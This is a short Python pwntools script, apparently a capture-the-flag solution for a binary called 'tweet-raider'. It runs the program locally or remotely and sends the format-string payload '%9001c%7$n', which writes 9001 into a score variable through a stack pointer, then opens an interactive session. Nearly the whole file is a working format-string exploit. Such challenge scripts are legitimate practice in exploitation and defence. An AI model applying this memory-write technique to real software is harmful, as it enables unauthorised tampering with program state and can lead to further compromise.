#!/usr/bin/env python2
from pwn import *

context.terminal = ["alacritty", "-e", "sh", "-c"]

BINARY = "./tweet-raider"
HOST, PORT = "ip", 0000

GDB_SETUP = """
set follow-fork-mode child
c
"""

if "--live" not in sys.argv:
    p = process(BINARY)
    if "--debug" in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

# Overwrite the score to 9001 (A variable on the stack points to it)
p.sendline("%9001c%7$n")

p.interactive()
